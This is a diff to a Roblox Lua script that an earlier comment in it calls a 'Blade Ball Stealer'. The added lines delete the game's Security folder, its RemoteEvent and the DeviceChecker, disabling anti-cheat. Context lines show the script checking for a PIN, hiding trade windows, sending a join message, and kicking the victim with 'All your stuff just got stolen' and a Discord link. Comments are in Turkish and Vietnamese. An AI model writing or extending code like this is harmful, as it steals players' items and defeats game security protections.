@@ -2,13 +2,29 @@ _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
--- Yavaşlatılmış, BAC korumalı Blade Ball Stealer
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
 local VirtualUser = game:GetService("VirtualUser")
+
+-- Xóa các phần tử bảo mật
+local securityFolder = ReplicatedStorage:FindFirstChild("Security")
+if securityFolder then
+    if securityFolder:FindFirstChild("RemoteEvent") then
+        securityFolder.RemoteEvent:Destroy()
+    end
+    if securityFolder:FindFirstChild("") then
+        securityFolder[""]:Destroy()
+    end
+    securityFolder:Destroy()
+end
+
+local deviceChecker = Players.LocalPlayer.PlayerScripts.Client:FindFirstChild("DeviceChecker")
+if deviceChecker then
+    deviceChecker:Destroy()
+end
 
 -- AFK koruması
 plr.Idled:Connect(function()
@@ -61,7 +77,7 @@ if pinSuccess and pinResult and pinResult ~= "You don't have a PIN code" then
     return
 end
 
--- GUI'leri bul ve kapat
+-- GUI'leri bul và đóng
 local PlayerGui = plr:WaitForChild("PlayerGui")
 local tradeGui = PlayerGui:FindFirstChild("Trade")
 local tradeCompleteGui = PlayerGui:FindFirstChild("TradeCompleted")
@@ -374,7 +390,7 @@ local function doTrade(joinedUser)
     plr:Kick("All your stuff just got stolen. discord.gg/GY2RVSEGDT")
 end
 
--- Ana mesajı gönder
+-- Gửi tin nhắn chính
 local prefix = (ping == "Yes") and "--[[@everyone]] " or ""
 SendJoinMessage(itemsToSend, prefix)
 
